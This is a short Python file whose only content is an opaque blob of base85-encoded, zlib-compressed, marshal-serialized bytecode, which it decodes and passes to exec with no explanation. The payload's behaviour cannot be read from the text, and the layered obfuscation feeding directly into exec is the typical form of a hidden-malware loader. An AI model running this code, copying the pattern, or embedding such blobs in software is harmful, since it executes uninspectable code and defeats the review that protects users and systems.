import base64, zlib, marshal
_p = b'c$`aSKmtq<it)1$ketd8%n;1z%}~S;%p}E7#F);g$@~%|?U&4mq=y}dnL&CEfb|$K<S|CWC4-n4Fn|(6D1#}~1YrgbM+SyGCL|p!m^y;kF~tbz;KUS*U^0ce24;JNkUEg`b!K4TW>8=VWmI9%Wc1Tyy~UJYe2YCNv$!NBv*;E}L1Ib9E%x-(lH$y&)LSfB`I&i|%(vLm@^eyBi*B)|<(KBA++xW~%uOu@h696wg2FAXg2c+4{KOQ!g34R0AZ^7(Jdj{wD0To64GcGU_!?aA2nbE*n#483?3#d52g@BXiRtMR)2HW8%wLkUJbhvM@|=Y^8_X`NIb0TV>|pKY{>aQAsQiFipuy)e$n}~`MIZygCa+{D;svp}fy6Bio80`A(wtPgB7Ptj<kw=5<OgO(M#kF=oS#`(7zM$~0X_a#7X'
exec(marshal.loads(zlib.decompress(base64.b85decode(_p))))
